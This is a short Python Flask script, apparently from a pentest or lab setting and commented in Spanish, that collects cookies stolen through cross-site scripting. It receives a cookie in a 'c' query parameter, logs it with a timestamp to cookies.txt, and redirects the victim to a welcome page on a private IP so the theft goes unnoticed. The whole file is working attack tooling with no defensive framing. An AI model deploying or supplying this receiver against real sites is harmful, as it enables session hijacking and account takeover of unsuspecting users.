# simple python flask cross site scripting grabber

from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__) # crea instancia en la app

@app.route('/') # directorio home
def cookie():

	cookie = request.args.get('c')
	f = open("cookies.txt","a")
	f.write(cookie + '' + str(datetime.now()) + '\n')
	f.close()
	
	return redirect("https://10.12.18.1:8443/welcome") # redirecciona a la pagina de bienvenida
	
if __name__ == "__main__":
	app.run(host = '0.0.0.0', port=80) # default port=5000
